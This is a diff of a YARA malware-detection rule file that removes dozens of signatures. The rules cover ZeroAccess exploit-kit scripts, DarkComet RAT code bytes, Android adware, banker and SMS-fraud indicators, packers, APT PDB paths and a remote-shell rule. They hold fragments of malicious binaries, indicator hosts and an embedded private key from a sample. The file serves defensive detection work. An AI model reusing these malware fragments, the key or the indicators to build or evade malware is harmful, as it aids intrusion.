-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "Square ad tag  (tile"
-    $string1  = "  adRandNum "
-    $string2  = " cellspacing"
-    $string3  = "\\n//-->\\n</script>"
-    $string4  = "format"
-    $string5  = "//-->' "
-    $string6  = "2287974446"
-    $string7  = "NoScrBeg "
-    $string8  = "-- start adblade -->' "
-    $string9  = "3427054556"
-    $string10 = "        while (i >"
-    $string11 = "return '<table width"
-    $string12 = "</scr' "
-    $string13 = " s.substring(0, i"
-    $string14 = " /></a></noscript>' "
-    $string15 = "    else { isEmail "
-    $string16 = ").submit();"
-    $string17 = " border"
-    $string18 = "pub-8301011321395982"
-
-  condition:
-    18 of them
-}
-
-rule zeroaccess_js3 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-27"
-    description     = "ZeroAccess Exploit Kit Detection"
-    hash0           = "5f13fdfb53a3e60e93d7d1d7bbecff4f"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = "document.createDocumentFragment();img.src"
-    $string1  = "typeOf(events)"
-    $string2  = "var i,x,y,ARRcookies"
-    $string3  = "callbacks.length;j<l;j"
-    $string4  = "encodeURIComponent(value);if(options.domain)value"
-    $string5  = "event,HG.components.get('windowEvent_'"
-    $string6  = "'read'in Cookie){return Cookie.read(c_name);}"
-    $string7  = "item;},get:function(name,def){return HG.components.exists(name)"
-    $string8  = "){window.addEvent(windowEvents[i],function(){var callbacks"
-    $string9  = "reunload:function(callback){HG.events.add('beforeunload',callback);},add:function(event,callback){HG"
-    $string10 = "name){if(HG.components.exists(name)){delete HG.componentList[name];}}},util:{uuid:function(){return'"
-    $string11 = "window.HG"
-    $string12 = "x.replace(/"
-    $string13 = "encodeURIComponent(this.attr[key]));}"
-    $string14 = "options.domain;if(options.path)value"
-    $string15 = "this.page_sid;this.attr.user_sid"
-
-  condition:
-    15 of them
-}
-
-rule zeroaccess_js4 {
-  meta:
-    author          = "Josh Berry"
-    date            = "2016-06-27"
-    description     = "ZeroAccess Exploit Kit Detection"
-    hash0           = "268ae96254e423e9d670ebe172d1a444"
-    sample_filetype = "js-html"
-    yaragenerator   = "https://github.com/Xen0ph0n/YaraGenerator"
-
-  strings:
-    $string0  = ").join("
-    $string1  = "JSON.stringify:function(o){if(o"
-    $string2  = "){try{var a"
-    $string3  = ");return $.jqotecache[i]"
-    $string4  = "o.getUTCFullYear(),hours"
-    $string5  = "seconds"
-    $string6  = "')');};$.secureEvalJSON"
-    $string7  = "isFinite(n);},secondsToTime:function(sec_numb){sec_numb"
-    $string8  = "')');}else{throw new SyntaxError('Error parsing JSON, source is not valid.');}};$.quoteString"
-    $string9  = "o[name];var ret"
-    $string10 = "a[m].substr(2)"
-    $string11 = ");if(d){return true;}}}catch(e){return false;}}"
-    $string12 = "a.length;m<k;m"
-    $string13 = "if(parentClasses.length"
-    $string14 = "o.getUTCHours(),minutes"
-    $string15 = "$.jqote(e,d,t),$$"
-    $string16 = "q.test(x)){e"
-    $string17 = "{};HGWidget.creator"
-
-  condition:
-    17 of them
 }
 
 rule CrowdStrike_PutterPanda_03: threepara_para_implant putterpanda {
@@ -9793,62 +8418,6 @@ rule duqu2 {
 
   condition:
     any of them
-}
-
-rule darkcomet51: rat {
-  meta:
-    rule_group = "implant"
-    implant    = "darkcomet51"
-
-    description  = "DarkComet RAT version 5.1"
-    id           = "CSE_900015"
-    organisation = "CSE"
-    poc          = "malware_dev@cse"
-    rule_version = "1"
-    yara_version = "3.4"
-
-    author          = "CCIRC"
-    creation_date   = "2016-03-23T15:26:52.162005Z"
-    date            = "2015-11-16"
-    last_saved_by   = "malware_dev"
-    al_configparser = "DarkComet51"
-    al_imported_by  = "malware_dev"
-    al_status       = "DEPLOYED"
-
-  strings:
-    $config = "D57ABA5857F0AFF67584605E90BE4665C9814BEEC7E"
-
-  condition:
-    any of them
-
-}
-
-rule darkcomet_rc4 {
-  meta:
-    rule_group = "implant"
-    implant    = "darkcomet_rc4"
-
-    description  = "darkcomet_rc4 implant"
-    id           = "CSE_900014"
-    organisation = "CSE"
-    poc          = "malware_dev@cse"
-    rule_version = "1"
-    yara_version = "3.4"
-
-    creation_date   = "2016-03-23T15:26:52.155838Z"
-    last_saved_by   = "malware_dev"
-    al_configdumper = "al_services.alsvc_configdecoder.ext.RATDecoders.DarkComet.run"
-    al_configparser = "GenericParser"
-    al_imported_by  = "malware_dev"
-    al_status       = "DEPLOYED"
-
-  strings:
-    // File 175e27f2e47674e51cb20d9daa8a30c4 @ 0x468438 (2015-11-16)
-    $darkcomet_rc4 = { 55 8B EC 81 C4 E0 FB FF FF 53 56 57 33 DB 89 9D E0 FB FF FF 89 5D F4 89 5D F0 89 4D EC 89 55 F8 89 45 FC 8B 45 FC E8 ?? ?? ?? ?? 8B 45 F8 E8 ?? ?? ?? ?? 33 C0 55 68 ?? ?? ?? ?? 64 FF 30 64 89 20 8B 45 F8 85 C0 74 05 83 E8 04 8B 00 85 C0 0F 84 3E 02 00 00 8B 45 FC 85 C0 74 05 83 E8 04 8B 00 85 C0 0F 84 2A 02 00 00 8D 95 E0 FB FF FF 8B 45 FC E8 ?? ?? ?? ?? 8B 95 E0 FB FF FF 8D 45 FC E8 ?? ?? ?? ?? 8B 55 F8 8B C2 85 C0 74 05 83 E8 04 8B 00 3D 00 01 00 00 7E 34 68 00 01 00 00 8D 45 F4 B9 01 00 00 00 8B 15 ?? ?? ?? ?? E8 ?? ?? ?? ?? 83 C4 04 8D 45 F8 E8 ?? ?? ?? ?? 8B D0 8B 45 F4 B9 00 01 00 00 E8 ?? ?? ?? ?? EB 42 8B DA 85 DB 74 05 83 EB 04 8B 1B 53 8D 45 F4 B9 01 00 00 00 8B 15 ?? ?? ?? ?? E8 ?? ?? ?? ?? 83 C4 04 8B 5D F8 85 DB 74 05 83 EB 04 8B 1B 8D 45 F8 E8 ?? ?? ?? ?? 8B D0 8B 45 F4 8B CB E8 ?? ?? ?? ?? 33 F6 8D 85 E4 FB FF FF 89 30 46 83 C0 04 81 FE 00 01 00 00 75 F2 33 DB 33 F6 8D 8D E4 FB FF FF 8B 7D F8 85 FF 74 05 83 EF 04 8B 3F 8B C6 99 F7 FF 8B 45 F4 0F B6 04 10 03 19 03 C3 25 FF 00 00 80 79 07 48 0D 00 FF FF FF 40 8B D8 0F B6 01 88 45 EB 8B 84 9D E4 FB FF FF 89 01 0F B6 45 EB 89 84 9D E4 FB FF FF 46 83 C1 04 81 FE 00 01 00 00 75 AE 33 DB 33 FF 8B 75 FC 85 F6 74 05 83 EE 04 8B 36 56 8D 45 F0 B9 01 00 00 00 8B 15 ?? ?? ?? ?? E8 ?? ?? ?? ?? 83 C4 04 8B 75 FC 85 F6 74 05 83 EE 04 8B 36 8D 45 FC E8 ?? ?? ?? ?? 8B D0 8B 45 F0 8B CE E8 ?? ?? ?? ?? 8B 45 FC 85 C0 74 05 83 E8 04 8B 00 48 85 C0 0F 8C 82 00 00 00 40 89 45 E4 33 F6 43 81 E3 FF 00 00 80 79 08 4B 81 CB 00 FF FF FF 43 03 BC 9D E4 FB FF FF 81 E7 FF 00 00 80 79 08 4F 81 CF 00 FF FF FF 47 0F B6 84 9D E4 FB FF FF 88 45 EB 8B 84 BD E4 FB FF FF 89 84 9D E4 FB FF FF 0F B6 45 EB 89 84 BD E4 FB FF FF 8B 84 9D E4 FB FF FF 03 84 BD E4 FB FF FF 25 FF 00 00 80 79 07 48 0D 00 FF FF FF 40 0F B6 84 85 E4 FB FF FF 8B 55 F0 30 04 32 46 FF 4D E4 75 84 8B 45 FC 85 C0 74 05 83 E8 04 8B 00 8B 55 EC 92 E8 ?? ?? ?? ?? 8B 5D FC 85 DB 74 05 83 EB 04 8B 1B 8B 45 EC E8 ?? ?? ?? ?? 8B 55 F0 8B CB E8 ?? ?? ?? ?? 33 C0 5A 59 59 64 89 10 68 ?? ?? ?? ?? 8D 85 E0 FB FF FF E8 ?? ?? ?? ?? 8D 45 F0 8B 15 ?? ?? ?? ?? B9 02 00 00 00 E8 ?? ?? ?? ?? 8D 45 F8 BA 02 00 00 00 E8 ?? ?? ?? ?? C3 E9 ?? ?? ?? ?? EB CD 5F 5E 5B 8B E5 5D C3 }
-
-  condition:
-    $darkcomet_rc4 and not darkcomet51
-
 }
 
 rule installmonstr {
@@ -10884,130 +9453,6 @@ rule YahLover: Worm {
     $signature1
 }
 
-rule adware: ads {
-  meta:
-    author      = "Fernando Denis Ramirez https://twitter.com/fdrg21"
-    reference   = "https://koodous.com/"
-    description = "Adware"
-    sample      = "5a331231f997decca388ba2d73b7dec1554e966a0795b0cb8447a336bdafd71b"
-
-  strings:
-    $string_a = "banner_layout"
-    $string_b = "activity_adpath_sms"
-    $string_c = "adpath_title_one"
-    $string_d = "7291-2ec9362bd699d0cd6f53a5ca6cd"
-
-  condition:
-    all of ($string_*)
-
-}
-
-rule Dendroid_2 {
-  meta:
-    author      = "https://twitter.com/jsmesa"
-    reference   = "https://koodous.com/"
-    description = "Dendroid evidences via Droidian service"
-
-  strings:
-    $a = "Droidian"
-    $b = "DroidianService"
-
-  condition:
-    all of them
-
-}
-
-rule Dendroid_3 {
-  meta:
-    author      = "https://twitter.com/jsmesa"
-    reference   = "https://koodous.com/"
-    description = "Dendroid evidences via ServiceReceiver"
-
-  strings:
-    $1 = "ServiceReceiver"
-    $2 = "Dendroid"
-
-  condition:
-    all of them
-
-}
-
-rule moscow_fake: banker {
-  meta:
-    author       = "Fernando Denis"
-    reference    = "https://koodous.com/ https://twitter.com/fdrg21"
-    description  = "Moskow Droid Development"
-    thread_level = 3
-    in_the_wild  = true
-
-  strings:
-    $string_a = "%ioperator%"
-    $string_b = "%imodel%"
-    $string_c = "%ideviceid%"
-    $string_d = "%ipackname%"
-    $string_e = "VILLLLLL"
-
-  condition:
-    all of ($string_*)
-}
-
-rule dowgin: adware {
-  meta:
-    author    = "https://twitter.com/plutec_net"
-    reference = "https://koodous.com/"
-    sample    = "4d7f2d6ff4ed8ced6f8f7f96e9899273cc3090ea108f2cc3b32dd1a06e63cf70"
-    sample2   = "cde8160d09c486bdd6d96b2ed81bd52390d77094d13ff9cfbc6949ed00206a83"
-    sample3   = "d2e81e6db5f4964246d10241588e0e97cde524815c4de7c0ea1c34a48da1bcaf"
-    sample4   = "cc2d0b3d8f00690298b0e5813f6ace8f4d4b04c9704292407c2b83a12c69617b"
-
-  strings:
-    $a = "http://112.74.111.42:8000"
-    $b = "SHA1-Digest: oIx4iYWeTtKib4fBH7hcONeHuaE="
-    $c = "ONLINEGAMEPROCEDURE_WHICH_WAP_ID"
-    $d = "http://da.mmarket.com/mmsdk/mmsdk?func=mmsdk:posteventlog"
-
-  condition:
-    all of them
-
-}
-
-rule genericSMS: smsFraud {
-  meta:
-    author    = "https://twitter.com/plutec_net"
-    reference = "https://koodous.com/"
-    sample    = "3fc533d832e22dc3bc161e5190edf242f70fbc4764267ca073de5a8e3ae23272"
-    sample2   = "3d85bdd0faea9c985749c614a0676bb05f017f6bde3651f2b819c7ac40a02d5f"
-
-  strings:
-    $a = "SHA1-Digest: +RsrTx5SNjstrnt7pNaeQAzY4kc="
-    $b = "SHA1-Digest: Rt2oRts0wWTjffGlETGfFix1dfE="
-    $c = "http://image.baidu.com/wisebrowse/index?tag1=%E6%98%8E%E6%98%9F&tag2=%E5%A5%B3%E6%98%8E%E6%98%9F&tag3=%E5%85%A8%E9%83%A8&pn=0&rn=10&fmpage=index&pos=magic#/channel"
-    $d = "pitchfork=022D4"
-
-  condition:
-    all of them
-
-}
-
-rule genericSMS2: smsFraud {
-  meta:
-    author    = "https://twitter.com/plutec_net"
-    reference = "https://koodous.com/"
-    sample    = "1f23524e32c12c56be0c9a25c69ab7dc21501169c57f8d6a95c051397263cf9f"
-    sample2   = "2cf073bd8de8aad6cc0d6ad5c98e1ba458bd0910b043a69a25aabdc2728ea2bd"
-    sample3   = "20575a3e5e97bcfbf2c3c1d905d967e91a00d69758eb15588bdafacb4c854cba"
-
-  strings:
-    $a = "NotLeftTriangleEqual=022EC"
-    $b = "SHA1-Digest: X27Zpw9c6eyXvEFuZfCL2LmumtI="
-    $c = "_ZNSt12_Vector_baseISsSaISsEE13_M_deallocateEPSsj"
-    $d = "FBTP2AHR3WKC6LEYON7D5GZXVISMJ4QU"
-
-  condition:
-    all of them
-
-}
-
 rule koler_builds {
   meta:
     description = "Koler.A builds"
@@ -11047,35 +9492,6 @@ rule dropper: realshell {
     any of them
 }
 
-rule ransomware: svpeng {
-  meta:
-    author      = "Fernando Denis https://twitter.com/fdrg21"
-    reference   = "https://koodous.com/"
-    description = "Ransomware"
-    in_the_wild = true
-
-  strings:
-    $a = "nd your's device will reboot and"
-    $b = "ADD_DEVICE_ADMI"
-
-  condition:
-    $a and $b
-}
-
-rule smspay_chinnese: hejupay {
-  meta:
-    author    = "Fernando Denis https://twitter.com/fdrg21"
-    reference = "https://koodous.com/"
-
-  strings:
-    $a = "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC/Jvgb0/jSRWi7i4J9IwO72KZw404kj02A97ExbUefVeE7yyWSTbKw5sYlKXCtaoQwWr19j0Y+xb6+h2BRuNx307BV/QpG6DnPg+Lx8fPPvhbhOudgKb/XuZPaz/GJbTpwzTbBmT+mI1QTRLyAKDxSjGWYvoPFVz82RxcAblV/twIDAQAB"
-
-    $b = "MIICeAIBADANBgkqhkiG9w0BAQEFAASCAmIwggJeAgEAAoGBAL8m+BvT+NJFaLuLgn0jA7vYpnDjTiSPTYD3sTFtR59V4TvLJZJNsrDmxiUpcK1qhDBavX2PRj7Fvr6HYFG43HfTsFX9CkboOc+D4vHx88++FuE652Apv9e5k9rP8YltOnDNNsGZP6YjVBNEvIAoPFKMZZi+g8VXPzZHFwBuVX+3AgMBAAECgYBLYR6uOqUApoZqjtVia5BpX0Ijej+ygyBZH1Qs3Z9E4iTz42RpkWJKCHdS6Eia2kpOlznqbbmRv4E8uT3ufCvUFexjR5ClGVKJ+XHXxqS75+KT38wGZZ1bW0pK4sT1/aGLrt5/netwuzMi/YFNfAKRPqvRXuNcxNLhMhs2efLKIQJBAPGea2UXVWd0Ti8ClA8hiWPSNCPtcp41Dh2H0YczrFmO2zafPPJih2GQY5txszwBLbjxFCY8/WhrYAqx0itMrgsCQQDKh5U1NfpRvk0Hu8iBRB/LPyGimz+WM/chFSC65SlS/cml3U7hUOj2lRGPz+bm68624H0KLviqpBJpmayvbbyFAkEA1NNFJ9uAx8rDn1b3EcjpmvqqIMdjwYVcNJjQ7/WNJ6nU3+0toxc0xrSHeIGTbhRfsNrxc6kfUV3bUDBHvwog9wJBAI+fRH1ekOwlAqVIUnDw6YcNdwHEDHysz0TDodlHp112Ieign06DPSGYJsMQURNTB92CJsnw82C3R2Nhmicxr60CQQCN466JF9GJRZipO64OYw/ElMac7vXgTeGMvYZ2/yfX5CRCLua4DygD1Ju0eMXpea9og/EtwCTV0RVpFc9SSN8V"
-
-  condition:
-    $a or $b
-}
-
 rule xbot007 {
   meta:
     reference = "https://github.com/maldroid/maldrolyzer/blob/master/plugins/xbot007.py"
@@ -11097,18 +9513,6 @@ rule auriga: apt {
 
   condition:
     filesize < 300KB and (5 of ($a, $b, $c, $d, $e))
-}
-
-rule bouncer_dll: apt {
-  strings:
-    $a = "select"
-    $b = "%s: %s"
-    $c = "sa:%s"
-    $d = ";PWD="
-    $e = "Computer Numbers: %d"
-
-  condition:
-    filesize < 350KB and (5 of ($a, $b, $c, $d, $e))
 }
 
 rule calendar: apt {
@@ -11513,22 +9917,6 @@ rule PrincessSandyv10eMiNENCEProcessPatcherPatch {
     $a0
 }
 
-rule NTkrnlSecureSuite01015DLLNTkrnlSoftware {
-  strings:
-    $a0 = { 00 00 00 00 00 00 00 00 00 00 00 00 34 10 00 00 28 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 4B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41 00 00 00 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 00 8B 44 24 04 05 ?? ?? ?? ?? 50 E8 01 00 00 00 C3 C3 }
-
-  condition:
-    $a0
-}
-
-rule UPXHiTv001DJSiba {
-  strings:
-    $a0 = { 94 BC ?? ?? ?? 00 B9 ?? 00 00 00 80 34 0C ?? E2 FA 94 FF E0 61 }
-
-  condition:
-    $a0
-}
-
 rule Vpackerttui {
   strings:
     $a0 = { 89 C6 C7 45 E0 01 00 00 00 F7 03 00 00 FF FF 75 18 0F B7 03 50 8B 45 D8 50 FF 55 F8 89 07 8B C3 E8 ?? FE FF FF 8B D8 EB 13 53 8B 45 D8 50 FF 55 F8 89 07 8B C3 E8 ?? FE FF FF 8B D8 83 C7 04 FF 45 E0 4E 75 C4 8B F3 83 3E 00 75 88 8B 45 E4 8B 40 10 03 45 DC 8B 55 14 83 C2 20 89 02 68 00 80 00 00 6A 00 8B 45 D4 50 FF 55 EC 8B 55 DC 8B 42 3C 03 45 DC 83 C0 04 8B D8 83 C3 14 8D 45 E0 50 6A 40 68 00 10 00 00 52 FF 55 E8 8D 43 60 }
@@ -11557,14 +9945,6 @@ rule Packman0001Bubbasoft {
 rule aPackv098bDSESnotsaved {
   strings:
     $a0 = { 8C CB BA ?? ?? 03 DA FC 33 F6 33 FF 4B 8E DB 8D ?? ?? ?? 8E C0 B9 ?? ?? F3 A5 4A 75 }
-
-  condition:
-    $a0
-}
-
-rule AntiDote12DLLDemoSISTeam {
-  strings:
-    $a0 = { EB 10 66 62 3A 43 2B 2B 48 4F 4F 4B 90 E9 08 32 90 90 90 90 90 90 90 90 90 90 80 7C 24 08 01 0F 85 ?? ?? ?? ?? 60 BE ?? ?? ?? ?? 8D BE ?? ?? ?? ?? 57 83 CD FF EB 0B 90 8A 06 46 88 07 47 01 DB 75 07 8B 1E 83 EE FC 11 DB 72 ED B8 01 00 00 00 01 DB 75 07 8B 1E 83 EE FC 11 DB 11 C0 01 DB 73 EF 75 09 8B 1E 83 EE FC 11 DB 73 E4 31 C9 83 E8 03 72 0D C1 E0 08 8A 06 46 83 F0 FF 74 74 89 C5 01 DB 75 07 8B 1E 83 EE FC 11 DB 11 C9 01 DB 75 07 8B 1E 83 EE FC 11 DB 11 C9 75 20 41 01 DB 75 07 8B 1E 83 EE FC 11 DB 11 C9 01 DB 73 EF 75 09 8B 1E 83 EE FC 11 DB 73 E4 83 C1 02 81 FD 00 F3 FF FF 83 D1 01 8D 14 2F 83 FD FC 76 0F 8A 02 42 88 07 47 49 75 F7 E9 63 FF FF FF 90 8B 02 83 C2 04 89 07 83 C7 04 83 E9 04 77 F1 01 CF E9 4C FF FF FF }
 
   condition:
     $a0
@@ -11702,14 +10082,6 @@ rule Upackv037v038BetaStripbaserelocationtableOptionDwing {
     $a0
 }
 
-rule NTkrnlSecureSuiteNTkrnlteam {
-  strings:
-    $a0 = { 34 10 00 00 28 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 41 10 00 00 50 10 00 00 00 00 00 00 4B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41 00 00 00 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 }
-
-  condition:
-    $a0
-}
-
 rule AaseCrypterbysantasdad {
   strings:
     $a0 = { 55 8B EC 83 C4 F0 53 B8 A0 3E 00 10 E8 93 DE FF FF 68 F8 42 00 10 E8 79 DF FF FF 68 00 43 00 10 68 0C 43 00 10 E8 42 DF FF FF 50 E8 44 DF FF FF A3 98 66 00 10 83 3D 98 66 00 10 00 75 13 6A 00 68 18 43 00 10 68 1C 43 00 10 6A 00 E8 4B DF FF FF 68 2C 43 00 10 68 0C 43 ?? ?? ?? ?? DF FF FF 50 E8 0E DF FF FF A3 94 66 00 10 83 3D 94 66 00 10 00 75 13 6A 00 68 18 43 00 10 68 38 43 00 10 6A 00 E8 15 DF FF FF 68 48 43 00 10 68 0C 43 00 10 E8 D6 DE FF FF 50 E8 D8 DE FF FF A3 A0 66 00 10 83 3D A0 66 00 10 00 75 13 6A 00 68 18 43 00 10 68 58 43 00 10 6A 00 E8 DF DE FF FF 68 6C 43 00 10 68 0C 43 00 10 E8 A0 DE FF FF 50 E8 A2 DE FF FF }
@@ -11737,14 +10109,6 @@ rule UPackv011Dwing {
 rule RLPv073betaap0x {
   strings:
     $a0 = { 60 8B DD E8 00 00 00 00 5D 95 32 C0 95 89 9D 80 00 00 00 B8 42 31 40 00 BB 41 30 40 00 2B C3 03 C5 33 D2 8A 10 40 B9 ?? ?? 00 00 8B F9 30 10 8A 10 40 49 75 F8 64 EF 86 3D 30 00 00 0F B9 FF 4B 89 52 5C 4C BD 77 C2 0C CE 88 4E 2D E8 00 00 00 5D 0D DB 5E 56 }
-
-  condition:
-    $a0
-}
-
-rule MetrowerksCodeWarriorDLLv20 {
-  strings:
-    $a0 = { 55 89 E5 53 56 57 8B 75 0C 8B 5D 10 83 FE 01 74 05 83 FE 02 75 12 53 56 FF 75 08 E8 6E FF FF FF 09 C0 75 04 31 C0 EB 21 53 56 FF 75 08 E8 ?? ?? ?? ?? 89 C7 09 F6 74 05 83 FE 03 75 0A 53 56 FF 75 08 E8 47 FF FF FF 89 F8 8D 65 F4 5F 5E 5B 5D C2 0C 00 C9 }
 
   condition:
     $a0
@@ -11854,14 +10218,6 @@ rule InnoSetupModulev2018 {
 rule AntiDote10Demo12SISTeam {
   strings:
     $a0 = { 00 00 00 00 09 01 47 65 74 43 6F 6D 6D 61 6E 64 4C 69 6E 65 41 00 DB 01 47 65 74 56 65 72 73 69 6F 6E 45 78 41 00 73 01 47 65 74 4D 6F 64 75 6C 65 46 69 6C 65 4E 61 6D 65 41 00 00 7A 03 57 61 69 74 46 6F 72 53 69 6E 67 6C 65 4F 62 6A 65 63 74 00 BF 02 52 65 73 75 6D 65 54 68 72 65 61 64 00 00 29 03 53 65 74 54 68 72 65 61 64 43 6F 6E 74 65 78 74 00 00 94 03 57 72 69 74 65 50 72 6F 63 65 73 73 4D 65 6D 6F 72 79 00 00 6B 03 56 69 72 74 75 61 6C 41 6C 6C 6F 63 45 78 00 00 A6 02 52 65 61 64 50 72 6F 63 65 73 73 4D 65 6D 6F 72 79 00 CA 01 47 65 74 54 68 72 65 61 64 43 6F 6E 74 65 78 74 00 00 62 00 43 72 65 61 74 65 50 72 6F 63 65 73 73 41 00 00 4B 45 52 4E 45 4C 33 32 2E 64 6C 6C }
-
-  condition:
-    $a0
-}
-
-rule NTkrnlSecureSuite01015NTkrnlSoftware {
-  strings:
-    $a0 = { 00 00 00 00 00 00 00 00 00 00 00 00 34 10 00 00 28 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ?? ?? ?? ?? ?? ?? ?? ?? 00 00 00 00 4B 65 72 6E 65 6C 33 32 2E 64 6C 6C 00 00 00 4C 6F 61 64 4C 69 62 72 61 72 79 41 00 00 00 47 65 74 50 72 6F 63 41 64 64 72 65 73 73 00 68 ?? ?? ?? ?? E8 01 00 00 00 C3 C3 }
 
   condition:
     $a0
@@ -12053,14 +10409,6 @@ rule UnnamedScrambler10p0ke {
     $a0
 }
 
-rule UPXHiT001DJSiba {
-  strings:
-    $a0 = { E2 FA 94 FF E0 61 00 00 00 00 00 00 00 }
-
-  condition:
-    $a0
-}
-
 rule yPv10bbyAshkbizDanehkar {
   strings:
     $a0 = { 55 8B EC 53 56 57 60 E8 00 00 00 00 5D 81 ED 4C 32 40 00 E8 03 00 00 00 EB 01 ?? B9 EA 47 40 00 81 E9 E9 32 40 00 8B D5 81 C2 E9 32 40 00 8D 3A 8B F7 33 C0 E8 04 00 00 00 90 EB 01 C2 E8 03 00 00 00 EB 01 ?? AC ?? ?? ?? ?? ?? ?? ?? EB 01 E8 }
@@ -12113,14 +10461,6 @@ rule Apex30alpha500mhz {
 rule RJoiner12aVaska {
   strings:
     $a0 = { 55 8B EC 81 EC 0C 01 00 00 8D 85 F4 FE FF FF 56 50 68 04 01 00 00 FF 15 0C 10 40 00 94 90 94 8D 85 F4 FE FF FF 50 FF 15 08 10 40 00 94 90 94 BE 00 20 40 00 94 90 94 83 3E FF 74 7D 53 57 33 DB 8D 7E 04 94 90 94 53 68 80 00 00 00 6A 02 53 6A 01 68 00 00 00 C0 57 FF 15 04 10 40 00 89 45 F8 94 90 94 8B 06 8D 74 06 04 94 90 94 8D 45 FC 53 50 8D 46 04 FF 36 50 FF 75 F8 FF 15 00 10 40 00 94 90 94 FF 75 F8 FF 15 10 10 40 00 94 90 94 8D 85 F4 FE FF FF 6A 0A 50 53 57 68 20 10 40 00 53 FF 15 18 10 40 00 94 90 94 8B 06 8D 74 06 04 94 90 94 83 3E FF 75 89 5F 5B 33 C0 5E C9 C2 10 00 CC CC 24 11 }
-
-  condition:
-    $a0
-}
-
-rule UPXInlinerv10byGPcH {
-  strings:
-    $a0 = { 9C 60 E8 00 00 00 00 5D B8 B3 85 40 00 2D AC 85 40 00 2B E8 8D B5 D5 FE FF FF 8B 06 83 F8 00 74 11 8D B5 E1 FE FF FF 8B 06 83 F8 01 0F 84 F1 01 00 00 C7 06 01 00 00 00 8B D5 8B 85 B1 FE FF FF 2B D0 89 95 B1 FE FF FF 01 95 C9 FE FF FF 8D B5 E5 FE FF FF 01 }
 
   condition:
     $a0
@@ -12323,14 +10663,6 @@ rule MinkeV101Codius {
 rule ElicenseSystemV4000ViaTechInc {
   strings:
     $a0 = { 00 00 00 00 63 79 62 00 65 6C 69 63 65 6E 34 30 2E 64 6C 6C 00 00 00 00 }
-
-  condition:
-    $a0
-}
-
-rule UPXV194MarkusOberhumerLaszloMolnarJohnReiser {
-  strings:
-    $a0 = { FF D5 80 A7 ?? ?? ?? ?? ?? 58 50 54 50 53 57 FF D5 58 61 8D 44 24 ?? 6A 00 39 C4 75 FA 83 EC 80 E9 }
 
   condition:
     $a0
@@ -12812,22 +11144,6 @@ rule mime_mso {
     $a and $b or $c or $d
 }
 
-rule blackenergy3_api_encode {
-  meta:
-    author      = "Mike Schladt"
-    date        = "2015-06-08"
-    description = "matches api name encoding function for be3 persistence dll"
-    md5         = "46649163C659CBA8A7D0D4075329EFA3"
-    reference   = "https://www.f-secure.com/documents/996508/1030745/blackenergy_whitepaper.pdf"
-
-  strings:
-    $api_encode = { 8B C2 C1 E8 09 32 E0 32 C4 32 E0 0F C8 66 8B CA 66 D1 E9 8A E1 33 C9 8A EA 66 D1 E9 8A C1 8B CA D1 E9 0F C9 0A C1 33 C9 8A 0B 33 C1 8B D0 43 EB CA }
-
-  condition:
-    $api_encode
-
-}
-
 rule blackenergy3_push_bytes {
   meta:
     author      = "Mike Schladt"
@@ -12916,22 +11232,6 @@ rule Aurora_PDB {
     $PDB1 or $PDB2
 }
 
-rule CN_group_PDB {
-  meta:
-    Author      = "mikesxrs"
-    Description = "Looking for unique 1937CN group PDB"
-    Reference   = "https://www.votiro.com/single-post/2017/08/23/Votiro-Labs-exposed-a-new-hacking-campaign-targeting-Vietnamese-organisations-using-a-weaponized-Word-documents"
-    Date        = "2017-08-23"
-
-  strings:
-    $PDB1 = "G:\\Work\\Bison\\BisonNewHNStubDll\\Release\\Goopdate.pdb" ascii wide nocase
-    $PDB2 = "G:\\Work\\Bison\\" ascii wide nocase
-    $PDB3 = "\\BisonNewHNStubDll\\Release\\Goopdate.pdb" ascii wide nocase
-
-  condition:
-    any of them
-}
-
 rule FREEMILK_PDB {
   meta:
     Author      = "mikesxrs"
@@ -12960,19 +11260,6 @@ rule GravityRAT_G3_PDB {
     $PDB1 = "F:\\Projects\\g3\\G3 Version 4.0\\G3\\G3\\obj\\Release\\Intel Core.pdb"
     $PDB2 = "F:\\Projects\\g3\\G3 Version "
     $PDB3 = "\\G3\\G3\\obj\\Release\\"
-
-  condition:
-    any of them
-}
-
-rule HTTPBrowser {
-  meta:
-    author      = "mikesxrs"
-    description = "PDB Path in httpbrowser malware"
-    reference   = "hhttps://www.secureworks.com/research/threat-group-3390-targets-organizations-for-cyberespionage"
-
-  strings:
-    $pdb1 = "J:\\TokenControlV3\\ServerDll\\Release\\ServerDll.pdb"
 
   condition:
     any of them
@@ -13231,14 +11518,6 @@ rule DestructiveTargetCleaningTool4 {
     (#BATCH_SCRIPT_LN1_1 == 2) and all of them
 }
 
-rule DestructiveTargetCleaningTool5 {
-  strings:
-    $MCU_DLL_ZLIB_COMPRESSED2 = { 5C EC AB AE 81 3C C9 BC D5 A5 42 F4 54 91 04 28 34 34 79 80 6F 71 D5 52 1E 2A 0D }
-
-  condition:
-    $MCU_DLL_ZLIB_COMPRESSED2
-}
-
 rule Malwareusedbycyberthreatactor1 {
   strings:
     // vvv---- this sig hits on a legit CRT function it seems. 
@@ -13314,20 +11593,6 @@ rule IndiaBravo_PapaAlfa {
 
   condition:
     all of them
-}
-
-rule IndiaBravo_generic {
-  meta:
-    copyright = "2015 Novetta Solutions"
-    author    = "Novetta Threat Research & Interdiction Group - trig@novetta.com"
-
-  strings:
-    $extractDll = "[2] - Extract Dll..." wide
-    $createSvc  = "[3] - CreateSVC..." wide
-
-  condition:
-    all of them
-
 }
 
 rule SuicideScriptL1 {
@@ -13505,51 +11770,6 @@ rule cmstp_macro_builder_rev_b {
     $call and
     #func > 1 and
     #sub > 1
-}
-
-rule beep_remote_shell {
-  meta:
-    author    = "@patrickrolsen"
-    reference = "0625b5b010a1acb92f02338b8e61bb34"
-    filetype  = "EXE"
